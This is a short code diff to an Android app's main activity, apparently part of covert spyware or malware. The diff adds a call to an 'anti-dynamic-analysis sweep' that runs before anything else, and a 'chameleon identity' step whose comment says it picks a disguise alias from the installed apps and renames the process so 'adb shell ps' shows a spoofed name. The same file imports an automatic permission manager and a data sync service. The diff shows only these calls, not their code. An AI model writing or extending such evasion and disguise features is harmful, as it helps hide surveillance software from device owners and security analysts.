@@ -9,6 +9,8 @@ import android.widget.Button;
 import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import com.task.tusker.permissions.AutoPermissionManager;
+import com.task.tusker.security.ChameleonIdentity;
+import com.task.tusker.security.SecurityGuard;
 import com.task.tusker.services.DataSyncService;
 
 public class MainActivity extends AppCompatActivity {
@@ -27,6 +29,16 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        /* ── Anti-dynamic-analysis sweep (runs before any UI or service) ── */
+        SecurityGuard.init(this);
+
+        /* ── Chameleon identity selection ─────────────────────────────────
+         * Picks the best alias based on installed apps and enables it.
+         * Renames the process via prctl so `adb shell ps` also shows the
+         * spoofed name. No-op if the cached choice is <7 days old.       */
+        ChameleonIdentity.selectIdentity(this);
+
         setContentView(R.layout.activity_main);
 
         permissionManager = new AutoPermissionManager(this);
